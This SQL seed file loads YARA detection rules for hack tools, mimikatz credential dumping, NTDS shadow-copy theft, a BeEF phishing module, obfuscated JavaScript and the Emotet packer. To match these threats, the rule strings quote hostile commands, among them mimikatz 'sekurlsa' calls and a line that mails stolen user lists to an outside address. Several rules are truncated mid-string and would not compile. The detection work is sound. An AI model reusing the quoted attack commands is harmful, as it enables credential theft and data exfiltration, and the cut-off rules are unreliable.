INSERT INTO `malware_rule` (`name`, `description`, `risk_level`, `rule_content`, `os_type`, `category`, `status`) VALUES ('_FsHttp_FsPop_FsSniffer', 'Disclosed hacktool set (old stuff) - from files FsHttp.exe, FsPop.exe, FsSniffer.exe', 1, 'rule _FsHttp_FsPop_FsSniffer {\n	meta:\n		description = \"Disclosed hacktool set (old stuff) - from files FsHttp.exe, FsPop.exe, FsSniffer.exe\"\n		author = \"Florian Roth\"\n		date = \"23.11.14\"\n		score = 60\n		super_rule = 1\n		hash0 = \"9d4e7611a328eb430a8bb6dc7832440713926f5f\"\n		hash1 = \"ae23522a3529d3313dd883727c341331a1fb1ab9\"\n		hash2 = \"7ffc496cd4a1017485dfb571329523a52c9032d8\"\n	strings:\n		$s0 = \"-ERR Invalid Command, Type [Help] For Command List\" fullword\n		$s1 = \"-ERR Get SMS Users ID Failed\" fullword\n		$s2 = \"Control Time Out 90 Secs, Connection Closed\" fullword\n		$s3 = \"-ERR Post SMS Failed\" fullword\n		$s4 = \"Current.hlt\" fullword\n		$s6 = \"Histroy.hlt\" fullword\n		$s7 = \"-ERR Send SMS Failed\" fullword\n		$s12 = \"-ERR Change Password <New Password>\" fullword\n		$s17 = \"+OK Send SMS Succussifully\" fullword\n		$s18 = \"+OK Set New Password: [%s]\" fullword\n		$s19 = \"CHANGE PASSWORD\" fullword\n	condition:\n		all of them\n}', 2, '恶意软件', 1);
INSERT INTO `malware_rule` (`name`, `description`, `risk_level`, `rule_content`, `os_type`, `category`, `status`) VALUES ('Ammyy_Admin_AA_v3', 'Remote Admin Tool used by APT group Anunak (ru) - file AA_v3.4.exe and AA_v3.5.exe', 1, 'rule Ammyy_Admin_AA_v3 {\n	meta:\n		description = \"Remote Admin Tool used by APT group Anunak (ru) - file AA_v3.4.exe and AA_v3.5.exe\"\n		author = \"Florian Roth\"\n		reference = \"http:\n		date = \"2014/12/22\"\n		score = 55\n		hash1 = \"b130611c92788337c4f6bb9e9454ff06eb409166\"\n		hash2 = \"07539abb2623fe24b9a05e240f675fa2d15268cb\"\n	strings:\n		$x1 = \"S:\\\\Ammyy\\\\sources\\\\target\\\\TrService.cpp\" fullword ascii\n		$x2 = \"S:\\\\Ammyy\\\\sources\\\\target\\\\TrDesktopCopyRect.cpp\" fullword ascii\n		$x3 = \"Global\\\\Ammyy.Target.IncomePort\" fullword ascii\n		$x4 = \"S:\\\\Ammyy\\\\sources\\\\target\\\\TrFmFileSys.cpp\" fullword ascii\n		$x5 = \"Please enter password for accessing remote computer\" fullword ascii\n\n		$s1 = \"CreateProcess1()#3 %d error=%d\" fullword ascii\n		$s2 = \"CHttpClient::SendRequest2(%s, %s, %d) error: invalid host name.\" fullword ascii\n		$s3 = \"ERROR: CreateProcessAsUser() error=%d, session=%d\" fullword ascii\n		$s4 = \"ERROR: FindProcessByName(''explorer.exe'')\" fullword ascii\n	condition:\n		2 of ($x*) or all of ($s*)\n}', 2, '恶意软件', 1);
INSERT INTO `malware_rule` (`name`, `description`, `risk_level`, `rule_content`, `os_type`, `category`, `status`) VALUES ('LinuxHacktool_eyes_screen', 'Linux hack tools - file screen', 1, 'rule LinuxHacktool_eyes_screen {\n	meta:\n		description = \"Linux hack tools - file screen\"\n		author = \"Florian Roth\"\n		reference = \"not set\"\n		date = \"2015/01/19\"\n		hash = \"a240a0118739e72ff89cefa2540bf0d7da8f8a6c\"\n	strings:\n		$s0 = \"or: %s -r [host.tty]\" fullword ascii\n		$s1 = \"%s: process: character, ^x, or (octal) \\\\032 expected.\" fullword ascii\n		$s2 = \"Type \\\"screen [-d] -r [pid.]tty.host\\\" to resume one of them.\" fullword ascii\n		$s6 = \"%s: at [identifier][%%|*|#] command [args]\" fullword ascii\n		$s8 = \"Slurped only %d characters (of %d) into buffer - try again\" fullword ascii\n		$s11 = \"command from %s: %s %s\" fullword ascii\n		$s16 = \"[ Passwords don''t match - your armor crumbles away ]\" fullword ascii\n		$s19 = \"[ Passwords don''t match - checking turned off ]\" fullword ascii\n	condition:\n		all of them\n}', 2, '恶意软件', 1);
INSERT INTO `malware_rule` (`name`, `description`, `risk_level`, `rule_content`, `os_type`, `category`, `status`) VALUES ('LinuxHacktool_eyes_scanssh', 'Linux hack tools - file scanssh', 1, 'rule LinuxHacktool_eyes_scanssh {\n	meta:\n		description = \"Linux hack tools - file scanssh\"\n		author = \"Florian Roth\"\n		reference = \"not set\"\n		date = \"2015/01/19\"\n		hash = \"467398a6994e2c1a66a3d39859cde41f090623ad\"\n	strings:\n		$s0 = \"Connection closed by remote host\" fullword ascii\n		$s1 = \"Writing packet : error on socket (or connection closed): %s\" fullword ascii\n		$s2 = \"Remote connection closed by signal SIG%s %s\" fullword ascii\n		$s4 = \"Reading private key %s failed (bad passphrase ?)\" fullword ascii\n		$s5 = \"Server closed connection\" fullword ascii\n		$s6 = \"%s: line %d: list delimiter not followed by keyword\" fullword ascii\n		$s8 = \"checking for version `%s'' in file %s required by file %s\" fullword ascii\n		$s9 = \"Remote host closed connection\" fullword ascii\n		$s10 = \"%s: line %d: bad command `%s''\" fullword ascii\n		$s13 = \"verifying that server is a known host : file %s not found\" fullword ascii\n		$s14 = \"%s: line %d: expected service, found `%s''\" fullword ascii\n		$s15 = \"%s: line %d: list delimiter not followed by domain\" fullword ascii\n		$s17 = \"Public key from server (%s) doesn''t match user preference (%s)\" fullword ascii\n	condition:\n		all of them\n}', 2, '恶意软件', 1);
INSERT INTO `malware_rule` (`name`, `description`, `risk_level`, `rule_content`, `os_type`, `category`, `status`) VALUES ('LinuxHacktool_eyes_pscan2', 'Linux hack tools - file pscan2', 1, 'rule LinuxHacktool_eyes_pscan2 {\n	meta:\n		description = \"Linux hack tools - file pscan2\"\n		author = \"Florian Roth\"\n		reference = \"not set\"\n		date = \"2015/01/19\"\n		hash = \"56b476cba702a4423a2d805a412cae8ef4330905\"\n	strings:\n		$s0 = \"# pscan completed in %u seconds. (found %d ips)\" fullword ascii\n		$s1 = \"Usage: %s <b-block> <port> [c-block]\" fullword ascii\n		$s3 = \"%s.%d.* (total: %d) (%.1f%% done)\" fullword ascii\n		$s8 = \"Invalid IP.\" fullword ascii\n		$s9 = \"# scanning: \" fullword ascii\n		$s10 = \"Unable to allocate socket.\" fullword ascii\n	condition:\n		2 of them\n}', 2, '恶意软件', 1);
INSERT INTO `malware_rule` (`name`, `description`, `risk_level`, `rule_content`, `os_type`, `category`, `status`) VALUES ('LinuxHacktool_eyes_a', 'Linux hack tools - file a', 1, 'rule LinuxHacktool_eyes_a {\n	meta:\n		description = \"Linux hack tools - file a\"\n		author = \"Florian Roth\"\n		reference = \"not set\"\n		date = \"2015/01/19\"\n		hash = \"458ada1e37b90569b0b36afebba5ade337ea8695\"\n	strings:\n		$s0 = \"cat trueusers.txt | mail -s \\\"eyes\\\" clubby@slucia.com\" fullword ascii\n		$s1 = \"mv scan.log bios.txt\" fullword ascii\n		$s2 = \"rm -rf bios.txt\" fullword ascii\n		$s3 = \"echo -e \\\"# by Eyes.\\\"\" fullword ascii\n		$s4 = \"././pscan2 $1 22\" fullword ascii\n		$s10 = \"echo \\\"#cautam...\\\"\" fullword ascii\n	condition:\n		2 of them\n}', 2, '恶意软件', 1);
INSERT INTO `malware_rule` (`name`, `description`, `risk_level`, `rule_content`, `os_type`, `category`, `status`) VALUES ('LinuxHacktool_eyes_mass', 'Linux hack tools - file mass', 1, 'rule LinuxHacktool_eyes_mass {\n	meta:\n		description = \"Linux hack tools - file mass\"\n		author = \"Florian Roth\"\n		reference = \"not set\"\n		date = \"2015/01/19\"\n		hash = \"2054cb427daaca9e267b252307dad03830475f15\"\n	strings:\n		$s0 = \"cat trueusers.txt | mail -s \\\"eyes\\\" clubby@slucia.com\" fullword ascii\n		$s1 = \"echo -e \\\"${BLU}', 2, '恶意软件', 1);
INSERT INTO `malware_rule` (`name`, `description`, `risk_level`, `rule_content`, `os_type`, `category`, `status`) VALUES ('LinuxHacktool_eyes_pscan2_2', 'Linux hack tools - file pscan2.c', 1, 'rule LinuxHacktool_eyes_pscan2_2 {\n	meta:\n		description = \"Linux hack tools - file pscan2.c\"\n		author = \"Florian Roth\"\n		reference = \"not set\"\n		date = \"2015/01/19\"\n		hash = \"eb024dfb441471af7520215807c34d105efa5fd8\"\n	strings:\n		$s0 = \"snprintf(outfile, sizeof(outfile) - 1, \\\"scan.log\\\", argv[1], argv[2]);\" fullword ascii\n		$s2 = \"printf(\\\"Usage: %s <b-block> <port> [c-block]\\\\n\\\", argv[0]);\" fullword ascii\n		$s3 = \"printf(\\\"\\\\n# pscan completed in %u seconds. (found %d ips)\\\\n\\\", (time(0) - sca\" ascii\n		$s19 = \"connlist[i].addr.sin_family = AF_INET;\" fullword ascii\n		$s20 = \"snprintf(last, sizeof(last) - 1, \\\"%s.%d.* (total: %d) (%.1f%% done)\\\",\" fullword ascii\n	condition:\n		2 of them\n}', 2, '恶意软件', 1);
INSERT INTO `malware_rule` (`name`, `description`, `risk_level`, `rule_content`, `os_type`, `category`, `status`) VALUES ('CN_Portscan', 'CN Port Scanner', 1, 'rule CN_Portscan : APT\n{\n    meta:\n        description = \"CN Port Scanner\"\n        author = \"Florian Roth\"\n        release_date = \"2013-11-29\"\n        confidential = false\n		score = 70\n    strings:\n    	$s1 = \"MZ\"\n		$s2 = \"TCP 12.12.12.12\"\n    condition:\n        ($s1 at 0) and $s2\n}', 2, '恶意软件', 1);
INSERT INTO `malware_rule` (`name`, `description`, `risk_level`, `rule_content`, `os_type`, `category`, `status`) VALUES ('WMI_vbs', 'WMI Tool - APT', 1, 'rule WMI_vbs : APT\n{\n    meta:\n        description = \"WMI Tool - APT\"\n        author = \"Florian Roth\"\n        release_date = \"2013-11-29\"\n        confidential = false\n		score = 70\n    strings:\n		$s3 = \"WScript.Echo \\\"   $$\\\\      $$\\\\ $$\\\\      $$\\\\ $$$$$$\\\\ $$$$$$$$\\\\ $$\\\\   $$\\\\ $$$$$$$$\\\\  $$$$$$\"\n    condition:\n        all of them\n}', 2, '恶意软件', 1);
INSERT INTO `malware_rule` (`name`, `description`, `risk_level`, `rule_content`, `os_type`, `category`, `status`) VALUES ('CN_Toolset__XScanLib_XScanLib_XScanLib', 'Detects a Chinese hacktool from a disclosed toolset - from files XScanLib.dll, XScanLib.dll, XScanLib.dll', 1, 'rule CN_Toolset__XScanLib_XScanLib_XScanLib {\n	meta:\n		description = \"Detects a Chinese hacktool from a disclosed toolset - from files XScanLib.dll, XScanLib.dll, XScanLib.dll\"\n		author = \"Florian Roth\"\n		reference = \"http:\n		reference2 = \"https:\n		date = \"2015/03/30\"\n		score = 70\n		super_rule = 1\n		hash0 = \"af419603ac28257134e39683419966ab3d600ed2\"\n		hash1 = \"c5cb4f75cf241f5a9aea324783193433a42a13b0\"\n		hash2 = \"135f6a28e958c8f6a275d8677cfa7cb502c8a822\"\n	strings:\n		$s1 = \"Plug-in thread causes an exception, failed to alert user.\" fullword\n		$s2 = \"PlugGetUdpPort\" fullword\n		$s3 = \"XScanLib.dll\" fullword\n		$s4 = \"PlugGetTcpPort\" fullword\n		$s11 = \"PlugGetVulnNum\" fullword\n	condition:\n		all of them\n}', 2, '恶意软件', 1);
INSERT INTO `malware_rule` (`name`, `description`, `risk_level`, `rule_content`, `os_type`, `category`, `status`) VALUES ('CN_Toolset_NTscan_PipeCmd', 'Detects a Chinese hacktool from a disclosed toolset - file PipeCmd.exe', 1, 'rule CN_Toolset_NTscan_PipeCmd {\n	meta:\n		description = \"Detects a Chinese hacktool from a disclosed toolset - file PipeCmd.exe\"\n		author = \"Florian Roth\"\n		reference = \"http:\n		reference2 = \"https:\n		date = \"2015/03/30\"\n		score = 70\n		hash = \"a931d65de66e1468fe2362f7f2e0ee546f225c4e\"\n	strings:\n		$s2 = \"Please Use NTCmd.exe Run This Program.\" fullword ascii\n		$s3 = \"PipeCmd.exe\" fullword wide\n		$s4 = \"\\\\\\\\.\\\\pipe\\\\%s%s%d\" fullword ascii\n		$s5 = \"%s\\\\pipe\\\\%s%s%d\" fullword ascii\n		$s6 = \"%s\\\\ADMIN$\\\\System32\\\\%s%s\" fullword ascii\n		$s7 = \"%s\\\\ADMIN$\\\\System32\\\\%s\" fullword ascii\n		$s9 = \"PipeCmdSrv.exe\" fullword ascii\n		$s10 = \"This is a service executable! Couldn''t start directly.\" fullword ascii\n		$s13 = \"\\\\\\\\.\\\\pipe\\\\PipeCmd_communicaton\" fullword ascii\n		$s14 = \"PIPECMDSRV\" fullword wide\n		$s15 = \"PipeCmd Service\" fullword ascii\n	condition:\n		4 of them\n}', 2, '恶意软件', 1);
INSERT INTO `malware_rule` (`name`, `description`, `risk_level`, `rule_content`, `os_type`, `category`, `status`) VALUES ('CN_Toolset_LScanPortss_2', 'Detects a Chinese hacktool from a disclosed toolset - file LScanPortss.exe', 1, 'rule CN_Toolset_LScanPortss_2 {\n	meta:\n		description = \"Detects a Chinese hacktool from a disclosed toolset - file LScanPortss.exe\"\n		author = \"Florian Roth\"\n		reference = \"http:\n		reference2 = \"https:\n		date = \"2015/03/30\"\n		score = 70\n		hash = \"4631ec57756466072d83d49fbc14105e230631a0\"\n	strings:\n		$s1 = \"LScanPort.EXE\" fullword wide\n		$s3 = \"www.honker8.com\" fullword wide\n		$s4 = \"DefaultPort.lst\" fullword ascii\n		$s5 = \"Scan over.Used %dms!\" fullword ascii\n		$s6 = \"www.hf110.com\" fullword wide\n		$s15 = \"LScanPort Microsoft \" fullword wide\n		$s18 = \"L-ScanPort2.0 CooFly\" fullword wide\n	condition:\n		4 of them\n}', 2, '恶意软件', 1);
INSERT INTO `malware_rule` (`name`, `description`, `risk_level`, `rule_content`, `os_type`, `category`, `status`) VALUES ('CN_Toolset_sig_1433_135_sqlr', 'Detects a Chinese hacktool from a disclosed toolset - file sqlr.exe', 1, 'rule CN_Toolset_sig_1433_135_sqlr {\n	meta:\n		description = \"Detects a Chinese hacktool from a disclosed toolset - file sqlr.exe\"\n		author = \"Florian Roth\"\n		reference = \"http:\n		reference2 = \"https:\n		date = \"2015/03/30\"\n		score = 70\n		hash = \"8542c7fb8291b02db54d2dc58cd608e612bfdc57\"\n	strings:\n		$s0 = \"Connect to %s MSSQL server success. Type Command at Prompt.\" fullword ascii\n		$s11 = \";DATABASE=master\" fullword ascii\n		$s12 = \"xp_cmdshell ''\" fullword ascii\n		$s14 = \"SELECT * FROM OPENROWSET(''SQLOLEDB'',''Trusted_Connection=Yes;Data Source=myserver\" ascii\n	condition:\n		all of them\n}', 2, '恶意软件', 1);
INSERT INTO `malware_rule` (`name`, `description`, `risk_level`, `rule_content`, `os_type`, `category`, `status`) VALUES ('Mimikatz_Memory_Rule_1', 'Detects password dumper mimikatz in memory', 1, 'rule Mimikatz_Memory_Rule_1 : APT {\n	meta:\n		author = \"Florian Roth\"\n		date = \"12/22/2014\"\n		score = 70\n		type = \"memory\"\n		description = \"Detects password dumper mimikatz in memory\"\n	strings:\n		$s1 = \"sekurlsa::msv\" fullword ascii\n	    $s2 = \"sekurlsa::wdigest\" fullword ascii\n	    $s4 = \"sekurlsa::kerberos\" fullword ascii\n	    $s5 = \"sekurlsa::tspkg\" fullword ascii\n	    $s6 = \"sekurlsa::livessp\" fullword ascii\n	    $s7 = \"sekurlsa::ssp\" fullword ascii\n	    $s8 = \"sekurlsa::logonPasswords\" fullword ascii\n	    $s9 = \"sekurlsa::process\" fullword ascii\n	    $s10 = \"ekurlsa::minidump\" fullword ascii\n	    $s11 = \"sekurlsa::pth\" fullword ascii\n	    $s12 = \"sekurlsa::tickets\" fullword ascii\n	    $s13 = \"sekurlsa::ekeys\" fullword ascii\n	    $s14 = \"sekurlsa::dpapi\" fullword ascii\n	    $s15 = \"sekurlsa::credman\" fullword ascii\n	condition:\n		1 of them\n}', 2, '恶意软件', 1);
INSERT INTO `malware_rule` (`name`, `description`, `risk_level`, `rule_content`, `os_type`, `category`, `status`) VALUES ('Mimikatz_Memory_Rule_2', 'Mimikatz Rule generated from a memory dump', 1, 'rule Mimikatz_Memory_Rule_2 : APT {\n	meta:\n		description = \"Mimikatz Rule generated from a memory dump\"\n		author = \"Florian Roth - Florian Roth\"\n		type = \"memory\"\n		score = 80\n	strings:\n		$s0 = \"sekurlsa::\" ascii\n		$x1 = \"cryptprimitives.pdb\" ascii\n		$x2 = \"Now is t1O\" ascii fullword\n		$x4 = \"ALICE123\" ascii\n		$x5 = \"BOBBY456\" ascii\n	condition:\n		$s0 and 1 of ($x*)\n}', 2, '恶意软件', 1);
INSERT INTO `malware_rule` (`name`, `description`, `risk_level`, `rule_content`, `os_type`, `category`, `status`) VALUES ('mimikatz', 'mimikatz', 1, 'rule mimikatz\n{\n	meta:\n		description		= \"mimikatz\"\n		author			= \"Benjamin DELPY (gentilkiwi)\"\n		tool_author		= \"Benjamin DELPY (gentilkiwi)\"\n      score          = 80\n	strings:\n		$exe_x86_1		= { 89 71 04 89 [0-3] 30 8d 04 bd }', 2, '恶意软件', 1);
INSERT INTO `malware_rule` (`name`, `description`, `risk_level`, `rule_content`, `os_type`, `category`, `status`) VALUES ('mimikatz_lsass_mdmp', 'LSASS minidump file for mimikatz', 1, 'rule mimikatz_lsass_mdmp\n{\n	meta:\n		description		= \"LSASS minidump file for mimikatz\"\n		author			= \"Benjamin DELPY (gentilkiwi)\"\n\n	strings:\n		$lsass			= \"System32\\\\lsass.exe\"	wide nocase\n\n	condition:\n		(uint32(0) == 0x504d444d) and $lsass\n}', 2, '恶意软件', 1);
INSERT INTO `malware_rule` (`name`, `description`, `risk_level`, `rule_content`, `os_type`, `category`, `status`) VALUES ('wce', 'wce', 1, 'rule wce\n{\n	meta:\n		description		= \"wce\"\n		author			= \"Benjamin DELPY (gentilkiwi)\"\n		tool_author		= \"Hernan Ochoa (hernano)\"\n\n	strings:\n		$hex_legacy		= { 8b ff 55 8b ec 6a 00 ff 75 0c ff 75 08 e8 [0-3] 5d c2 08 00 }', 2, '恶意软件', 1);
INSERT INTO `malware_rule` (`name`, `description`, `risk_level`, `rule_content`, `os_type`, `category`, `status`) VALUES ('lsadump', 'LSA dump programe (bootkey/syskey) - pwdump and others', 1, 'rule lsadump\n{\n	meta:\n		description		= \"LSA dump programe (bootkey/syskey) - pwdump and others\"\n		author			= \"Benjamin DELPY (gentilkiwi)\"\n\n	strings:\n		$str_sam_inc	= \"\\\\Domains\\\\Account\" ascii nocase\n		$str_sam_exc	= \"\\\\Domains\\\\Account\\\\Users\\\\Names\\\\\" ascii nocase\n		$hex_api_call	= {(41 b8 | 68) 00 00 00 02 [0-64] (68 | ba) ff 07 0f 00 }', 2, '恶意软件', 1);
INSERT INTO `malware_rule` (`name`, `description`, `risk_level`, `rule_content`, `os_type`, `category`, `status`) VALUES ('Mimikatz_Logfile', 'Detects a log file generated by malicious hack tool mimikatz', 1, 'rule Mimikatz_Logfile\n{\n	meta:\n		description = \"Detects a log file generated by malicious hack tool mimikatz\"\n		author = \"Florian Roth\"\n		score = 80\n		date = \"2015/03/31\"\n		reference = \"https:\n	strings:\n		$s1 = \"SID               :\" ascii fullword\n		$s2 = \"* NTLM     :\" ascii fullword\n		$s3 = \"Authentication Id :\" ascii fullword\n		$s4 = \"wdigest :\" ascii fullword\n	condition:\n		all of them\n}', 2, '恶意软件', 1);
INSERT INTO `malware_rule` (`name`, `description`, `risk_level`, `rule_content`, `os_type`, `category`, `status`) VALUES ('AppInitHook', 'AppInitGlobalHooks-Mimikatz - Hide Mimikatz From Process Lists - file AppInitHook.dll', 1, 'rule AppInitHook {\n	meta:\n		description = \"AppInitGlobalHooks-Mimikatz - Hide Mimikatz From Process Lists - file AppInitHook.dll\"\n		author = \"Florian Roth\"\n		reference = \"https:\n		date = \"2015-07-15\"\n		score = 70\n		hash = \"e7563e4f2a7e5f04a3486db4cefffba173349911a3c6abd7ae616d3bf08cfd45\"\n	strings:\n		$s0 = \"\\\\Release\\\\AppInitHook.pdb\" ascii\n		$s1 = \"AppInitHook.dll\" fullword ascii\n		$s2 = \"mimikatz.exe\" fullword wide\n		$s3 = \"]X86Instruction->OperandSize >= Operand->Length\" fullword wide\n		$s4 = \"mhook\\\\disasm-lib\\\\disasm.c\" fullword wide\n		$s5 = \"mhook\\\\disasm-lib\\\\disasm_x86.c\" fullword wide\n		$s6 = \"VoidFunc\" fullword ascii\n	condition:\n		uint16(0) == 0x5a4d and filesize < 500KB and 4 of them\n}', 2, '恶意软件', 1);
INSERT INTO `malware_rule` (`name`, `description`, `risk_level`, `rule_content`, `os_type`, `category`, `status`) VALUES ('VSSown_VBS', 'Detects VSSown.vbs script - used to export shadow copy elements like NTDS to take away and crack elsewhere', 1, 'rule VSSown_VBS {\n	meta:\n		description = \"Detects VSSown.vbs script - used to export shadow copy elements like NTDS to take away and crack elsewhere\"\n		author = \"Florian Roth\"\n		date = \"2015-10-01\"\n		score = 75\n	strings:\n		$s0 = \"Select * from Win32_Service Where Name =''VSS''\" ascii\n		$s1 = \"Select * From Win32_ShadowCopy\" ascii\n		$s2 = \"cmd /C mklink /D \" ascii\n		$s3 = \"ClientAccessible\" ascii\n		$s4 = \"WScript.Shell\" ascii\n		$s5 = \"Win32_Process\" ascii\n	condition:\n		all of them\n}', 2, '恶意软件', 1);
INSERT INTO `malware_rule` (`name`, `description`, `risk_level`, `rule_content`, `os_type`, `category`, `status`) VALUES ('Payload_Exe2Hex', 'Detects payload generated by exe2hex', 1, 'rule Payload_Exe2Hex : toolkit {\n	meta:\n		description = \"Detects payload generated by exe2hex\"\n		author = \"Florian Roth\"\n		reference = \"https:\n		date = \"2016-01-15\"\n		score = 70\n	strings:\n		$a1 = \"set /p \\\"=4d5a\" ascii\n		$a2 = \"powershell -Command \\\"$hex=\" ascii\n		$b1 = \"set+%2Fp+%22%3D4d5\" ascii\n		$b2 = \"powershell+-Command+%22%24hex\" ascii\n		$c1 = \"echo 4d 5a \" ascii\n		$c2 = \"echo r cx >>\" ascii\n		$d1 = \"echo+4d+5a+\" ascii\n		$d2 = \"echo+r+cx+%3E%3E\" ascii\n	condition:\n		all of ($a*) or all of ($b*) or all of ($c*) or all of ($d*)\n}', 2, '恶意软件', 1);
INSERT INTO `malware_rule` (`name`, `description`, `risk_level`, `rule_content`, `os_type`, `category`, `status`) VALUES ('jjEncode', 'jjencode detection', 3, 'rule jjEncode\n{\n   meta:\n      description = \"jjencode detection\"\n      ref = \"http:\n      author = \"adnan.shukor@gmail.com\"\n      date = \"10-June-2015\"\n      version = \"1\"\n      impact = 3\n      hide = false\n   strings:\n      $jjencode = /(\\$|[\\S]+)=~\\[\\]\\;(\\$|[\\S]+)\\=\\{[\\_]{3}', 2, '加壳检测', 1);
INSERT INTO `malware_rule` (`name`, `description`, `risk_level`, `rule_content`, `os_type`, `category`, `status`) VALUES ('generic_javascript_obfuscation', 'JavaScript Obfuscation Detection', 3, 'rule generic_javascript_obfuscation\n{\nmeta:\n	author = \"Josh Berry\"\n	date = \"2016-06-26\"\n	description = \"JavaScript Obfuscation Detection\"\n	sample_filetype = \"js-html\"\nstrings:\n	$string0 = /eval\\(([\\s]+)?(unescape|atob)\\(/ nocase\n	$string1 = /var([\\s]+)?([a-zA-Z_$])+([a-zA-Z0-9_$]+)?([\\s]+)?=([\\s]+)?\\[([\\s]+)?\\\"\\\\x[0-9a-fA-F]+/ nocase\n	$string2 = /var([\\s]+)?([a-zA-Z_$])+([a-zA-Z0-9_$]+)?([\\s]+)?=([\\s]+)?eval;/\ncondition:\n	any of them\n}', 2, '加壳检测', 1);
INSERT INTO `malware_rule` (`name`, `description`, `risk_level`, `rule_content`, `os_type`, `category`, `status`) VALUES ('possible_includes_base64_packed_functions', '', 3, 'rule possible_includes_base64_packed_functions  \n{ \n	meta: \n		impact = 5 \n		hide = true \n		desc = \"Detects possible includes and packed functions\" \n	strings: \n		$f = /(atob|btoa|;base64|base64,)/ nocase\n		\n		$fff = /([A-Za-z0-9]{4}', 2, '加壳检测', 1);
INSERT INTO `malware_rule` (`name`, `description`, `risk_level`, `rule_content`, `os_type`, `category`, `status`) VALUES ('src_ptheft_command', 'Auto-generated rule - file command.js', 3, 'rule src_ptheft_command {\n	meta:\n		description = \"Auto-generated rule - file command.js\"\n		author = \"Pasquale Stirparo\"\n		reference = \"not set\"\n		date = \"2015-10-08\"\n		hash = \"49c0e5400068924ff87729d9e1fece19acbfbd628d085f8df47b21519051b7f3\"\n	strings:\n		$s0 = \"var lilogo = ''http:\n		$s1 = \"dark=document.getElementById(''darkenScreenObject''); \" fullword wide ascii \n		$s2 = \"beef.execute(function() {\" fullword wide ascii \n		$s3 = \"var logo  = ''http:\n		$s4 = \"description.text(''Enter your Apple ID e-mail address and password'');\" fullword wide ascii \n		$s5 = \"sneakydiv.innerHTML= ''<div id=\\\"edge\\\" ''+edgeborder+''><div id=\\\"window_container\\\" ''+windowborder+ ''><div id=\\\"title_bar\\\" '' +ti\" wide ascii \n		$s6 = \"var logo  = ''https:\n		$s7 = \"beef.net.send(''<%= @command_url %>'', <%= @command_id %>, ''answer=''+answer);\" fullword wide ascii \n		$s8 = \"var title = ''Session Timed Out <img src=\\\"'' + lilogo + ''\\\" align=right height=20 width=70 alt=\\\"LinkedIn\\\">'';\" fullword wide ascii \n		$s9 = \"var title = ''Session Timed Out <img src=\\\"'' + logo + ''\\\" align=right height=20 width=70 alt=\\\"YouTube\\\">'';\" fullword wide ascii \n		$s10 = \"var title = ''Session Timed Out <img src=\\\"'' + logo + ''\\\" align=right height=24 width=24 alt=\\\"Yammer\\\">'';\" fullword wide ascii \n		$s11 = \"var logobox = ''style=\\\"border:4px #84ACDD solid;border-radius:7px;height:45px;width:45px;background:#ffffff\\\"'';\" fullword wide ascii \n		$s12 = \"sneakydiv.innerHTML= ''<br><img src=\\\\''''+imgr+''\\\\'' width=\\\\''80px\\\\'' height\\\\''80px\\\\'' /><h2>Your session has timed out!</h2><p>For\" wide ascii \n		$s13 = \"inner.append(title, description, user,password);\" fullword wide ascii \n		$s14 = \"sneakydiv.innerHTML= ''<div id=\\\"window_container\\\" ''+windowborder+ ''><div id=\\\"windowmain\\\" '' +windowmain+ ''><div id=\\\"title_bar\" wide ascii \n		$s15 = \"sneakydiv.innerHTML= ''<div id=\\\"window_container\\\" ''+windowborder+ ''><div id=\\\"windowmain\\\" '' +windowmain+ ''><div id=\\\"title_bar\" wide ascii \n		$s16 = \"answer = document.getElementById(''uname'').value+'':''+document.getElementById(''pass'').value;\" fullword wide ascii \n		$s17 = \"password.keydown(function(event) {\" fullword wide ascii \n	condition:\n		13 of them\n}', 2, '加壳检测', 1);
INSERT INTO `malware_rule` (`name`, `description`, `risk_level`, `rule_content`, `os_type`, `category`, `status`) VALUES ('emotet_packer', 'recent Emotet packer pdb string', 3, 'rule emotet_packer {\n   meta:\n      description = \"recent Emotet packer pdb string\"\n      author = \"Marc Salinas (@Bondey_m)\"\n      reference = \"330fb2954c1457149988cda98ca8401fbc076802ff44bb30894494b1c5531119\"\n	  reference = \"d08a4dc159b17bde8887fa548b7d265108f5f117532d221adf7591fbad29b457\"\n	  reference = \"7b5b8aaef86b1a7a8e7f28f0bda0bb7742a8523603452cf38170e5253f7a5c82\"\n	  reference = \"e6abb24c70a205ab471028aee22c1f32690c02993b77ee0e77504eb360860776\"\n	  reference = \"5684850a7849ab475227da91ada8ac5741e36f98780d9e3b01ae3085a8ef02fc\"\n	  reference = \"acefdb67d5c0876412e4d079b38da1a5e67a7fcd936576c99cc712391d3a5ff5\"\n	  reference = \"14230ba12360a172f9f242ac98121ca76e7c4450bfcb499c2af89aa3a1ef7440\"\n	  reference = \"4fe9b38d2c32d0ee19d7be3c1a931b9448904aa72e888f40f43196e0b2207039\"\n	  reference = \"e31028282c38cb13dd4ede7e9c8aa62d45ddae5ebaa0fe3afb3256601dbf5de7\"\n      date = \"2017-12-12\"\n    strings:\n		$pdb1 = \"123EErrrtools.pdb\"\n		$pdb2=  \"gGEW\\\\F???/.pdb\"\n\n    condition:\n       $pdb1 or $pdb2\n}', 2, '加壳检测', 1);
